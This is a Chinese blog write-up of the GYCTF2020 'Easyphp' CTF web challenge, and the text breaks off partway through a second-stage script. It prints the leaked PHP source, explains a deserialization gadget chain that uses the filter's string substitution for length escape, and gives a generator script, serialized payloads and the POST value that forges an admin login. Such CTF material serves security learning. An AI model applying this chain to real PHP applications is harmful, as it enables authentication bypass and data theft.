 &lt;h2 id=&#34;gyctf2020easyphp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gyctf2020easyphp&#34;&gt;#&lt;/a&gt; [GYCTF2020]Easyphp&lt;/h2&gt;
&lt;h3 id=&#34;前言&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h3&gt;
&lt;h4 id=&#34;知识点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#知识点&#34;&gt;#&lt;/a&gt; 知识点：&lt;/h4&gt;
&lt;h5 id=&#34;wwwzip源码泄露&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wwwzip源码泄露&#34;&gt;#&lt;/a&gt; www.zip 源码泄露&lt;/h5&gt;
&lt;h5 id=&#34;php反序列化链poc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php反序列化链poc&#34;&gt;#&lt;/a&gt; PHP 反序列化链 POC&lt;/h5&gt;
&lt;h5 id=&#34;代码审计&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码审计&#34;&gt;#&lt;/a&gt; 代码审计&lt;/h5&gt;
&lt;h3 id=&#34;wp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wp&#34;&gt;#&lt;/a&gt; WP:&lt;/h3&gt;
&lt;p&gt;进入环境，题目是 easyphp 我就感觉要审源码。。。试了一下常见的泄露，发现存在 www.zip。把代码下载下来进行一下审计，发现 update.php 和 lib.php 可以利用：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
session_start();
function safe($parm)&amp;#123;
    $array= array(&#39;union&#39;,&#39;regexp&#39;,&#39;load&#39;,&#39;into&#39;,&#39;flag&#39;,&#39;file&#39;,&#39;insert&#39;,&amp;quot;&#39;&amp;quot;,&#39;\\&#39;,&amp;quot;*&amp;quot;,&amp;quot;alter&amp;quot;);
    return str_replace($array,&#39;hacker&#39;,$parm);
&amp;#125;
class User
&amp;#123;
    public $id;
    public $age=null;
    public $nickname=null;
    public function login() &amp;#123;
        if(isset($_POST[&#39;username&#39;])&amp;amp;&amp;amp;isset($_POST[&#39;password&#39;]))&amp;#123;
            echo &amp;quot;ok&amp;quot;;
            $mysqli=new dbCtrl();
            $this-&amp;gt;id=$mysqli-&amp;gt;login(&#39;select id,password from user where username=?&#39;);
            if($this-&amp;gt;id)&amp;#123;
            $_SESSION[&#39;id&#39;]=$this-&amp;gt;id;
            $_SESSION[&#39;login&#39;]=1;
            echo &amp;quot;你的ID是&amp;quot;.$_SESSION[&#39;id&#39;];
            echo &amp;quot;你好！&amp;quot;.$_SESSION[&#39;token&#39;];
            echo &amp;quot;&amp;lt;script&amp;gt;window.location.href=&#39;./update.php&#39;&amp;lt;/script&amp;gt;&amp;quot;;
            return $this-&amp;gt;id;
        &amp;#125;
    &amp;#125;
&amp;#125;
    public function update()&amp;#123;
        $Info=unserialize($this-&amp;gt;getNewinfo());
        //print_r($Info);
        $age=$Info-&amp;gt;age;
        $nickname=$Info-&amp;gt;nickname;
        $updateAction=new UpdateHelper($_SESSION[&#39;id&#39;],$Info,&amp;quot;update user SET age=$age,nickname=$nickname where id=&amp;quot;.$_SESSION[&#39;id&#39;]);
        //这个功能还没有写完 先占坑
    &amp;#125;
    public function getNewInfo()&amp;#123;
        $age=$_POST[&#39;age&#39;];
        $nickname=$_POST[&#39;nickname&#39;];
        return safe(serialize(new Info($age,$nickname)));
    &amp;#125;
    public function __destruct()&amp;#123;
        return file_get_contents($this-&amp;gt;nickname);//危
    &amp;#125;
    public function __toString()
    &amp;#123;
        $this-&amp;gt;nickname-&amp;gt;update($this-&amp;gt;age);
        return &amp;quot;0-0&amp;quot;;
    &amp;#125;
&amp;#125;
class Info&amp;#123;
    public $age;
    public $nickname;
    public $CtrlCase;
    public function __construct($age,$nickname)&amp;#123;
        $this-&amp;gt;age=$age;
        $this-&amp;gt;nickname=$nickname;
    &amp;#125;
    public function __call($name,$argument)&amp;#123;
        echo $this-&amp;gt;CtrlCase-&amp;gt;login($argument[0]);
    &amp;#125;
&amp;#125;
Class UpdateHelper&amp;#123;
    public $id;
    public $newinfo;
    public $sql;
    public function __construct($newInfo,$sql)&amp;#123;
        $newInfo=unserialize($newInfo);
        $upDate=new dbCtrl();
    &amp;#125;
    public function __destruct()
    &amp;#123;
        //var_dump($this-&amp;gt;sql);
        echo $this-&amp;gt;sql;
    &amp;#125;
&amp;#125;
class dbCtrl
&amp;#123;
    public $hostname=&amp;quot;127.0.0.1&amp;quot;;
    public $dbuser=&amp;quot;root&amp;quot;;
    public $dbpass=&amp;quot;root&amp;quot;;
    public $database=&amp;quot;test&amp;quot;;
    public $name;
    public $password;
    public $mysqli;
    public $token;
    public function __construct()
    &amp;#123;
        $this-&amp;gt;name=$_POST[&#39;username&#39;];
        $this-&amp;gt;password=$_POST[&#39;password&#39;];
        $this-&amp;gt;token=$_SESSION[&#39;token&#39;];
    &amp;#125;
    public function login($sql)
    &amp;#123;
        $this-&amp;gt;mysqli=new mysqli($this-&amp;gt;hostname, $this-&amp;gt;dbuser, $this-&amp;gt;dbpass, $this-&amp;gt;database);
        if ($this-&amp;gt;mysqli-&amp;gt;connect_error) &amp;#123;
            die(&amp;quot;连接失败，错误:&amp;quot; . $this-&amp;gt;mysqli-&amp;gt;connect_error);
        &amp;#125;
        $result=$this-&amp;gt;mysqli-&amp;gt;prepare($sql);
        $result-&amp;gt;bind_param(&#39;s&#39;, $this-&amp;gt;name);
        $result-&amp;gt;execute();
        $result-&amp;gt;bind_result($idResult, $passwordResult);
        $result-&amp;gt;fetch();
        $result-&amp;gt;close();
        if ($this-&amp;gt;token==&#39;admin&#39;) &amp;#123;
            return $idResult;
        &amp;#125;
        if (!$idResult) &amp;#123;
            echo(&#39;用户不存在!&#39;);
            return false;
        &amp;#125;
        if (md5($this-&amp;gt;password)!==$passwordResult) &amp;#123;
            echo(&#39;密码错误！&#39;);
            return false;
        &amp;#125;
        $_SESSION[&#39;token&#39;]=$this-&amp;gt;name;
        return $idResult;
    &amp;#125;
    public function update($sql)
    &amp;#123;
        //还没来得及写
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;update.php
&amp;lt;?php
require_once(&#39;lib.php&#39;);
echo &#39;&amp;lt;html&amp;gt;

&amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt;
&amp;lt;title&amp;gt;update&amp;lt;/title&amp;gt;
&amp;lt;h2&amp;gt;这是一个未完成的页面，上线时建议删除本页面&amp;lt;/h2&amp;gt;
&amp;lt;/html&amp;gt;&#39;;
if ($_SESSION[&#39;login&#39;]!=1)&amp;#123;
	echo &amp;quot;你还没有登陆呢！&amp;quot;;
&amp;#125;
$users=new User();
$users-&amp;gt;update();
if($_SESSION[&#39;login&#39;]===1)&amp;#123;
	require_once(&amp;quot;flag.php&amp;quot;);
	echo $flag;
&amp;#125;

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;update.php 那里只是输出你没登录，接下来的代码还会执行。update () 方法中会进行反序列化。&lt;/p&gt;
&lt;p&gt;update.php 那里只是输出你没登录，接下来的代码还会执行。update () 方法中会进行反序列化。&lt;/p&gt;
&lt;p&gt;简单的理一下 POC 的思路。本以为是利用 User 类的__construct 方法来读 flag.php，但是发现 safe () 过滤了 flag 和 \，因此会被过滤，无法读取。&lt;br&gt;
但是 UpdateHelper 类中也有一个__destruct () 方法，会 echo。&lt;/p&gt;
&lt;p&gt;正好 User 类存在__toString () 方法：&lt;/p&gt;
&lt;p&gt;再利用 $this-&amp;gt;nickname-&amp;gt;update () 去触发 Info 类的__call ()：&lt;/p&gt;
&lt;p&gt;这样就可以调用一个 login 方法。但是怎么得 flag？&lt;br&gt;
lib.php 中有 2 个 login 方法，User 类得 login 方法可以让 $_SESSION [‘login’]=1，但是必须返回了 id：&lt;/p&gt;
&lt;p&gt;跟进一下第 16 行得 login 方法，看一下逻辑：&lt;/p&gt;
&lt;p&gt;想要正常返回&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;R&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mtext&gt;，要么&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;idResult，要么&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.00773em;&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;要&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;么&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; this-&amp;gt;token==‘admin’，要么就是查对了用户名和密码才可以。&lt;/p&gt;
&lt;p&gt;这时候便很自然得可以想到思路了，因为反序列化得时候除了 User 类中 login 的这里不可控，其他基本都是可控的。：&lt;/p&gt;
&lt;p&gt;也就是说，要分 2 次。第一次反序列化最终调用的是 dbCtrl 类的 login，因为这里的 sql 语句和 dbCtrl 都可控，因此可以成功的&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mi&gt;I&lt;/mi&gt;&lt;mi&gt;O&lt;/mi&gt;&lt;mi&gt;N&lt;/mi&gt;&lt;msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;[&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;msup&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;_SESSION[&amp;#x27;token&amp;#x27;]=&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.001892em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.07847em;&#34;&gt;I&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10903em;&#34;&gt;N&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;this-&amp;gt;name;。控一下 name，让它是 admin。&lt;/p&gt;
&lt;p&gt;（更正，其实并不需要第二次反序列化，直接第一次反序列化设了 session 后，直接随便登录一下，用户名是 admin 即可，就可以触发 user 类的 login 方法了，不需要这里再反序列化构造来触发 User 类的 login 方法，我实际上也是思路太局限了。）&lt;/p&gt;
&lt;p&gt;第二次反序列化最终调用 User 类的 login 方法。因为这里：&lt;/p&gt;
&lt;p&gt;所以这时候 $this-&amp;gt;token=‘admin’，即这里满足，可以成功查到 id：&lt;/p&gt;
&lt;p&gt;这样可以 $_SESSION [‘login’]=1;&lt;/p&gt;
&lt;p&gt;得到 flag：&lt;/p&gt;
&lt;p&gt;接下来就要想办法构造 POC 了，先是第一次反序列化：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
class Info&amp;#123;
    public $age;
    public $nickname;
    public $CtrlCase;
    public function __construct()
    &amp;#123;
        $this-&amp;gt;age = &amp;quot;1&amp;quot;;
        $this-&amp;gt;nickname = &amp;quot;2&amp;quot;;
        $this-&amp;gt;CtrlCase=new dbCtrl();
        //$this-&amp;gt;CtrlCase=new User();
    &amp;#125;
&amp;#125;
class User
&amp;#123;
    public $id=&amp;quot;1&amp;quot;;
    public $age;
    public $nickname;
    public function __construct()
    &amp;#123;
        $this-&amp;gt;age=&#39;select &amp;quot;1&amp;quot;,&amp;quot;c4ca4238a0b923820dcc509a6f75849b&amp;quot; from user where username=?&#39;;
        $this-&amp;gt;nickname=new Info();
        //$this-&amp;gt;nickname-&amp;gt;CtrlCase=new User();
    &amp;#125;
&amp;#125;
Class UpdateHelper&amp;#123;
    public $sql;
&amp;#125;

class dbCtrl
&amp;#123;
    public $hostname=&amp;quot;127.0.0.1&amp;quot;;
    public $dbuser=&amp;quot;root&amp;quot;;
    public $dbpass=&amp;quot;root&amp;quot;;
    public $database=&amp;quot;test&amp;quot;;
    public $name=&amp;quot;admin&amp;quot;;
    public $password=&amp;quot;1&amp;quot;;
    public $mysqli;
    public $token;
    public $feng;
    public function __construct()
    &amp;#123;
        $this-&amp;gt;feng=new UpdateHelper();
        //$this-&amp;gt;token=&amp;quot;admin&amp;quot;;
    &amp;#125;
&amp;#125;
$a=new Info();
//$a-&amp;gt;CtrlCase=new dbCtrl();
$a-&amp;gt;CtrlCase-&amp;gt;feng-&amp;gt;sql=new User();
//$a-&amp;gt;CtrlCase-&amp;gt;feng-&amp;gt;sql-&amp;gt;nickname-&amp;gt;CtrlCase=new User();
//var_dump($a-&amp;gt;CtrlCase-&amp;gt;feng-&amp;gt;sql-&amp;gt;nickname);
//var_dump($a);
echo serialize($a);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;需要注意之所以 new UpdateHelper () 没有写在 Info 类中，而是写在 $this-&amp;gt;CtrlCase 中，是因为这里：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public function update()&amp;#123;
    $Info=unserialize($this-&amp;gt;getNewinfo());
    //print_r($Info);
    $age=$Info-&amp;gt;age;
    $nickname=$Info-&amp;gt;nickname;
    $updateAction=new UpdateHelper($_SESSION[&#39;id&#39;],$Info,&amp;quot;update user SET age=$age,nickname=$nickname where id=&amp;quot;.$_SESSION[&#39;id&#39;]);
    //这个功能还没有写完 先占坑
&amp;#125;
如果$this-&amp;gt;age或者$this-&amp;gt;nickname设成UpdateHelper的话，会因为把类对象当成字符产而报错。
产生的payload是这样：
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;O:4:&amp;quot;Info&amp;quot;:3:&amp;#123;s:3:&amp;quot;age&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;s:1:&amp;quot;2&amp;quot;;s:8:&amp;quot;CtrlCase&amp;quot;;O:6:&amp;quot;dbCtrl&amp;quot;:9:&amp;#123;s:8:&amp;quot;hostname&amp;quot;;s:9:&amp;quot;127.0.0.1&amp;quot;;s:6:&amp;quot;dbuser&amp;quot;;s:4:&amp;quot;root&amp;quot;;s:6:&amp;quot;dbpass&amp;quot;;s:4:&amp;quot;root&amp;quot;;s:8:&amp;quot;database&amp;quot;;s:4:&amp;quot;test&amp;quot;;s:4:&amp;quot;name&amp;quot;;s:5:&amp;quot;admin&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:6:&amp;quot;mysqli&amp;quot;;N;s:5:&amp;quot;token&amp;quot;;N;s:4:&amp;quot;feng&amp;quot;;O:12:&amp;quot;UpdateHelper&amp;quot;:1:&amp;#123;s:3:&amp;quot;sql&amp;quot;;O:4:&amp;quot;User&amp;quot;:3:&amp;#123;s:2:&amp;quot;id&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:3:&amp;quot;age&amp;quot;;s:72:&amp;quot;select &amp;quot;1&amp;quot;,&amp;quot;c4ca4238a0b923820dcc509a6f75849b&amp;quot; from user where username=?&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;O:4:&amp;quot;Info&amp;quot;:3:&amp;#123;s:3:&amp;quot;age&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;s:1:&amp;quot;2&amp;quot;;s:8:&amp;quot;CtrlCase&amp;quot;;O:6:&amp;quot;dbCtrl&amp;quot;:9:&amp;#123;s:8:&amp;quot;hostname&amp;quot;;s:9:&amp;quot;127.0.0.1&amp;quot;;s:6:&amp;quot;dbuser&amp;quot;;s:4:&amp;quot;root&amp;quot;;s:6:&amp;quot;dbpass&amp;quot;;s:4:&amp;quot;root&amp;quot;;s:8:&amp;quot;database&amp;quot;;s:4:&amp;quot;test&amp;quot;;s:4:&amp;quot;name&amp;quot;;s:5:&amp;quot;admin&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:6:&amp;quot;mysqli&amp;quot;;N;s:5:&amp;quot;token&amp;quot;;N;s:4:&amp;quot;feng&amp;quot;;O:12:&amp;quot;UpdateHelper&amp;quot;:1:&amp;#123;s:3:&amp;quot;sql&amp;quot;;N;&amp;#125;&amp;#125;&amp;#125;&amp;#125;&amp;#125;&amp;#125;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过反序列化字符逃逸，得到这样：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;O:4:&amp;quot;Info&amp;quot;:3:&amp;#123;s:3:&amp;quot;age&amp;quot;;s:901:&amp;quot;&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;s:1:&amp;quot;2&amp;quot;;s:8:&amp;quot;CtrlCase&amp;quot;;O:6:&amp;quot;dbCtrl&amp;quot;:9:&amp;#123;s:8:&amp;quot;hostname&amp;quot;;s:9:&amp;quot;127.0.0.1&amp;quot;;s:6:&amp;quot;dbuser&amp;quot;;s:4:&amp;quot;root&amp;quot;;s:6:&amp;quot;dbpass&amp;quot;;s:4:&amp;quot;root&amp;quot;;s:8:&amp;quot;database&amp;quot;;s:4:&amp;quot;test&amp;quot;;s:4:&amp;quot;name&amp;quot;;s:5:&amp;quot;admin&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:6:&amp;quot;mysqli&amp;quot;;N;s:5:&amp;quot;token&amp;quot;;N;s:4:&amp;quot;feng&amp;quot;;O:12:&amp;quot;UpdateHelper&amp;quot;:1:&amp;#123;s:3:&amp;quot;sql&amp;quot;;O:4:&amp;quot;User&amp;quot;:3:&amp;#123;s:2:&amp;quot;id&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:3:&amp;quot;age&amp;quot;;s:72:&amp;quot;select &amp;quot;1&amp;quot;,&amp;quot;c4ca4238a0b923820dcc509a6f75849b&amp;quot; from user where username=?&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;O:4:&amp;quot;Info&amp;quot;:3:&amp;#123;s:3:&amp;quot;age&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;s:1:&amp;quot;2&amp;quot;;s:8:&amp;quot;CtrlCase&amp;quot;;O:6:&amp;quot;dbCtrl&amp;quot;:9:&amp;#123;s:8:&amp;quot;hostname&amp;quot;;s:9:&amp;quot;127.0.0.1&amp;quot;;s:6:&amp;quot;dbuser&amp;quot;;s:4:&amp;quot;root&amp;quot;;s:6:&amp;quot;dbpass&amp;quot;;s:4:&amp;quot;root&amp;quot;;s:8:&amp;quot;database&amp;quot;;s:4:&amp;quot;test&amp;quot;;s:4:&amp;quot;name&amp;quot;;s:5:&amp;quot;admin&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:6:&amp;quot;mysqli&amp;quot;;N;s:5:&amp;quot;token&amp;quot;;N;s:4:&amp;quot;feng&amp;quot;;O:12:&amp;quot;UpdateHelper&amp;quot;:1:&amp;#123;s:3:&amp;quot;sql&amp;quot;;N;&amp;#125;&amp;#125;&amp;#125;&amp;#125;&amp;#125;&amp;#125;&amp;#125;&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;N;s:8:&amp;quot;CtrlCase&amp;quot;;N;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;post 传参：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;age=&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;unionunionunionload1&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;s:1:&amp;quot;2&amp;quot;;s:8:&amp;quot;CtrlCase&amp;quot;;O:6:&amp;quot;dbCtrl&amp;quot;:9:&amp;#123;s:8:&amp;quot;hostname&amp;quot;;s:9:&amp;quot;127.0.0.1&amp;quot;;s:6:&amp;quot;dbuser&amp;quot;;s:4:&amp;quot;root&amp;quot;;s:6:&amp;quot;dbpass&amp;quot;;s:4:&amp;quot;root&amp;quot;;s:8:&amp;quot;database&amp;quot;;s:4:&amp;quot;test&amp;quot;;s:4:&amp;quot;name&amp;quot;;s:5:&amp;quot;admin&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:6:&amp;quot;mysqli&amp;quot;;N;s:5:&amp;quot;token&amp;quot;;N;s:4:&amp;quot;feng&amp;quot;;O:12:&amp;quot;UpdateHelper&amp;quot;:1:&amp;#123;s:3:&amp;quot;sql&amp;quot;;O:4:&amp;quot;User&amp;quot;:3:&amp;#123;s:2:&amp;quot;id&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:3:&amp;quot;age&amp;quot;;s:72:&amp;quot;select &amp;quot;1&amp;quot;,&amp;quot;c4ca4238a0b923820dcc509a6f75849b&amp;quot; from user where username=?&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;O:4:&amp;quot;Info&amp;quot;:3:&amp;#123;s:3:&amp;quot;age&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;s:1:&amp;quot;2&amp;quot;;s:8:&amp;quot;CtrlCase&amp;quot;;O:6:&amp;quot;dbCtrl&amp;quot;:9:&amp;#123;s:8:&amp;quot;hostname&amp;quot;;s:9:&amp;quot;127.0.0.1&amp;quot;;s:6:&amp;quot;dbuser&amp;quot;;s:4:&amp;quot;root&amp;quot;;s:6:&amp;quot;dbpass&amp;quot;;s:4:&amp;quot;root&amp;quot;;s:8:&amp;quot;database&amp;quot;;s:4:&amp;quot;test&amp;quot;;s:4:&amp;quot;name&amp;quot;;s:5:&amp;quot;admin&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:6:&amp;quot;mysqli&amp;quot;;N;s:5:&amp;quot;token&amp;quot;;N;s:4:&amp;quot;feng&amp;quot;;O:12:&amp;quot;UpdateHelper&amp;quot;:1:&amp;#123;s:3:&amp;quot;sql&amp;quot;;N;&amp;#125;&amp;#125;&amp;#125;&amp;#125;&amp;#125;&amp;#125;&amp;#125;
第二次反序列化就同理了：
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
class Info&amp;#123;
    public $age;
    public $nickname;
    public $CtrlCase;
    public function __construct()
    &amp;#123;
        $this-&amp;gt;age = &amp;quot;1&amp;quot;;
